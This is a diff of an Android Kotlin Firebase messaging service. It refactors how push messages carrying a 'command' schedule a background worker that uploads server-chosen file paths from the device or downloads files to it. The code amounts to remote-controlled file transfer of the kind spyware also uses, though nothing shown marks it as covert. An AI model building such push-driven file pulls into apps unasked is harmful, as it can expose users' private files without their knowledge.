@@ -1,13 +1,10 @@
-// MyFirebaseMessagingService.kt
 package com.example.lta.service
 
 import android.util.Log
-import androidx.work.Data
-import androidx.work.OneTimeWorkRequestBuilder
-import androidx.work.WorkManager
-import androidx.work.Constraints
-import androidx.work.NetworkType
-import androidx.work.workDataOf
+import com.example.lta.BuildConfig
+import com.example.lta.MainApplication
+import com.example.lta.data.repository.DeviceRepository
+import com.example.lta.worker.DataFetchWorker
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
 import kotlinx.coroutines.CoroutineScope
@@ -15,7 +12,6 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
 import kotlinx.coroutines.launch
-import kotlinx.coroutines.plus
 
 class MyFirebaseMessagingService : FirebaseMessagingService() {
 
@@ -25,97 +21,56 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     }
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private lateinit var deviceRepository: DeviceRepository
 
     override fun onCreate() {
         super.onCreate()
         Log.d(TAG, "FirebaseMessagingService created - Build Type: ${if (BuildConfig.DEBUG) "DEBUG" else "RELEASE"}")
+        if (applicationContext is MainApplication) {
+            deviceRepository = (applicationContext as MainApplication).container.deviceRepository
+        }
     }
 
     override fun onNewToken(token: String) {
         super.onNewToken(token)
-        Log.d(TAG, "New FCM token received in ${if (BuildConfig.DEBUG) "DEBUG" else "RELEASE"} build: ${token.take(15)}...")
-        sendRegistrationToServer(token)
-    }
-    
-    // ... onTokenDeleted and sendRegistrationToServer are unchanged
-    fun onTokenDeleted() {
-        Log.d(TAG, "FCM token deleted. Notifying server to remove device.")
-        val context = applicationContext
-        val apiClient = ApiClient(context.getString(R.string.server_base_url))
-        val systemInfoManager = SystemInfoManager(context)
-        val deviceId = systemInfoManager.getDeviceId()
-        serviceScope.launch {
-            try {
-                val success = apiClient.deleteDevice(deviceId)
-                Log.i(TAG, "Device removal from server: ${if (success) "successful" else "failed"}")
-            } catch (e: Exception) {
-                Log.e(TAG, "Error notifying server of token deletion", e)
+        Log.d(TAG, "New FCM token received: ${token.take(15)}...")
+        if (::deviceRepository.isInitialized) {
+            serviceScope.launch {
+                deviceRepository.updateFcmToken(token)
             }
+        } else {
+            Log.e(TAG, "Repository not initialized, cannot update token.")
         }
     }
-
-    private fun sendRegistrationToServer(token: String) {
-        val context = applicationContext
-        val apiClient = ApiClient(context.getString(R.string.server_base_url))
-        val systemInfoManager = SystemInfoManager(context)
-        val appPrefs = AppPreferences(context)
-        val deviceModel = systemInfoManager.getDeviceModel()
-        val deviceId = systemInfoManager.getDeviceId()
-        serviceScope.launch {
-            try {
-                Log.i(TAG, "Attempting automatic registration in ${if (BuildConfig.DEBUG) "DEBUG" else "RELEASE"} build -> ID: $deviceId, Model: $deviceModel")
-                val success = apiClient.registerDevice(token, deviceModel, deviceId)
-                appPrefs.setRegistrationStatus(success)
-                val statusMessage = if (success) "successful" else "failed"
-                Log.i(TAG, "Automatic registration $statusMessage and status updated in preferences")
-            } catch (e: Exception) {
-                Log.e(TAG, "Error during automatic registration in ${if (BuildConfig.DEBUG) "DEBUG" else "RELEASE"} build", e)
-                appPrefs.setRegistrationStatus(false)
-            }
-        }
-    }
-
 
     override fun onMessageReceived(remoteMessage: RemoteMessage) {
         super.onMessageReceived(remoteMessage)
-        Log.d(TAG, "FCM Message From: ${remoteMessage.from} in ${if (BuildConfig.DEBUG) "DEBUG" else "RELEASE"} build")
+        Log.d(TAG, "FCM Message From: ${remoteMessage.from}")
 
-        if (remoteMessage.data.isNotEmpty()) {
-            Log.d(TAG, "Message data payload: ${remoteMessage.data}")
-
-            val command = remoteMessage.data[COMMAND_KEY]
-            if (command.isNullOrBlank()) {
-                Log.w(TAG, "Received FCM message without a '$COMMAND_KEY' key in data.")
-                return
-            }
-            
-            Log.d(TAG, "Received command: '$command'. Scheduling worker.")
-            
-            // Extract any additional data to pass to the worker
-            val extraData = mutableMapOf<String, String>()
-            
-            when (command) {
-                DataFetchWorker.COMMAND_UPLOAD_FILE -> {
-                    remoteMessage.data["filePath"]?.let { extraData["filePath"] = it }
-                }
-                DataFetchWorker.COMMAND_DOWNLOAD_FILE -> {
-                    remoteMessage.data["serverFilePath"]?.let { extraData["serverFilePath"] = it }
-                }
-            }
-
-            if (extraData.isEmpty() && (command == DataFetchWorker.COMMAND_UPLOAD_FILE || command == DataFetchWorker.COMMAND_DOWNLOAD_FILE)) {
-                 Log.w(TAG, "Command '$command' received without required path data. Aborting.")
-                 return
-            }
-            
-            // Schedule worker with command and any extra data
-            DataFetchWorker.scheduleWork(applicationContext, command, extraData)
-
-        } else {
-            Log.d(TAG, "Received FCM message with empty data payload")
+        val command = remoteMessage.data[COMMAND_KEY]
+        if (command.isNullOrBlank()) {
+            Log.w(TAG, "Received FCM message without a '$COMMAND_KEY' key.")
+            return
         }
+
+        Log.d(TAG, "Received command: '$command'. Scheduling worker.")
+
+        val extraData = remoteMessage.data.filterKeys { it != COMMAND_KEY }
+
+        if ((command == DataFetchWorker.COMMAND_UPLOAD_FILE && !extraData.containsKey("filePath")) ||
+            (command == DataFetchWorker.COMMAND_DOWNLOAD_FILE && !extraData.containsKey("serverFilePath"))) {
+             Log.w(TAG, "Command '$command' received without required path data. Aborting.")
+             return
+        }
+
+        DataFetchWorker.scheduleWork(applicationContext, command, extraData)
     }
-    
+
+    override fun onDeletedMessages() {
+        super.onDeletedMessages()
+        Log.w(TAG, "Some messages were deleted on the FCM server before delivery.")
+    }
+
     override fun onDestroy() {
         super.onDestroy()
         serviceScope.cancel()
